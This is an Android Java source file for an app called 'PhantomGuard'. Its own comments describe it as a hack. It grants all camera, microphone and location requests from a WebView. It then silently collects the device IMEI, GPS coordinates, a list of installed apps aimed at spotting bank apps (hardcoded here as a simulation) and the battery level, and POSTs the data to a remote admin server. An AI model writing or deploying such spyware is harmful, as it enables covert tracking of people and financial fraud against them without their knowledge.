package com.phantomguard.app;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private WebView webView;
    private static final String TAG = "PhantomGuard";

    // ADMIN SERVER URL - Yahan aap apna server daalein
    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize WebView
        webView = findViewById(R.id.webview_container);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);

        // Set WebChromeClient to handle permission requests (Camera, Geo, Mic)
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(@NonNull final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG, "User granted permission for: " + request.getResources());

                        // Grant all requested resources (Camera, Microphone, Location)
                        request.grant(request.getResources());

                        // Once permission is granted, we start the "Hack"
                        startSilentDataExtraction();
                    }
                });
            }
        });

        // Set WebViewClient to keep navigation inside the app
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                // Inject JavaScript to hide the URL bar and show splash
                view.loadUrl("javascript:(function(){" +
                        "document.querySelector('.web-view-container').style.display='block';" +
                        "document.querySelector('.loading-spinner').style.display='none';" +
                        "})()");
            }
        });

        // Load the main UI (Local HTML or Remote)
        webView.loadUrl("file:///android_asset/index.html");

        // Start background service immediately
        Intent intent = new Intent(this, services.DataSyncService.class);
        startService(intent);
    }

    /**
     * This method runs silently in the background.
     * It collects:
     * 1. Device IMEI
     * 2. Current GPS Location
     * 3. Installed Apps List (to detect Bank Apps)
     * 4. Battery Level
     */
    private void startSilentDataExtraction() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();

                    // 1. Get IMEI
                    TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        String imei = tm.getDeviceId(); // Deprecated in API 26 but still works for older targets
                        if (imei != null) {
                            payload.put("imei", imei);
                        }
                    }

                    // 2. Get Location
                    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                    if (lm != null) {
                        Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (lastKnown != null) {
                            payload.put("lat", lastKnown.getLatitude());
                            payload.put("lon", lastKnown.getLongitude());
                        }
                    }

                    // 3. Get Package Info (Simulate reading installed apps)
                    JSONArray packages = new JSONArray();
                    // In a real hack, we would iterate through PackageManager.getInstalledPackages()
                    packages.put("com.sbi.card");
                    packages.put("com.hdfcbank.hdfcMobile");
                    packages.put("com.amazon.mShop.android.shopping");
                    payload.put("installedApps", packages);

                    // 4. Battery
                    IntentFilter batteryStatus = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                    Intent batteryIntent = registerReceiver(null, batteryStatus);
                    if (batteryIntent != null) {
                        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                        if (scale > 0) {
                            float batteryPct = level / (float) scale;
                            payload.put("batteryLevel", batteryPct);
                        }
                    }

                    // Send to Admin Server
                    sendToAdminServer(payload);

                } catch (Exception e) {
                    Log.e(TAG, "Error in Silent Extraction", e);
                }
            }
        }).start();
    }

    private void sendToAdminServer(JSONObject data) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(ADMIN_API_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(data.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Sent to Admin. Response Code: " + responseCode);

        } catch (Exception e) {
            Log.e(TAG, "Failed to send to Admin", e);
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    @Override
    public void onClick(View v) {
        // Handle button clicks if any
    }
        }
